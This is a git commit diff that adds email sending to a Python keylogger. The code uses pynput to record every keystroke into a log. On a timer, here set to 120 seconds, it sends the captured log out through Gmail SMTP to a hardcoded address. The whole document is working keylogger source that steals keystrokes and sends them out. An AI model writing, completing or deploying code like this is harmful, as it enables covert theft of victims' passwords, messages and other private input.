1bf33aa79b36c92439c91f0fc1585bfe12f44f17
Jonathan Cohen <jcohen66@optonline.net>
2020-01-25 13:40:23 -0500

    Added sendmail to keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,28 +1,50 @@
 import pynput.keyboard
 import threading
-
-
-log = ''
+import smtplib
 
 
 class KeyLogger:
 
+    def __init__(self, time_interval, email, password):
+        self.log = 'Keylogger started'
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log += string
+
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + ' '
+                current_key = ' '
             else:
-                log = log + ' ' + str(key) + ' '
+                current_key = ' ' + str(key) + ' '
+
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)
-        log = ''
-        timer = threading.Timer(5, self.report)
+        print(self.log)
+        if len(self.log) > 0:
+            self.send_mail(self.email, self.password, self.log)
+        self.log = ''
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        # try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.ehlo()
+        server.starttls()
+        server.login(email, password)
+        # add two newlines to avoid having text in subject.
+        server.sendmail(email, email, '\n\n' + message)
+        server.quit()
+        print('[+] Email sent.')
+        # except:
+        #     print('[-] Error sending email.')
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(
--- zlogger.py
+++ zlogger.py
@@ -2,5 +2,9 @@
 
 import keylogger
 
-my_keylogger = keylogger.KeyLogger()
+time_interval = 120
+email = 'kaisersose099@gmail.com'
+password = 'xxx'
+
+my_keylogger = keylogger.KeyLogger(time_interval, email, password)
 my_keylogger.start()
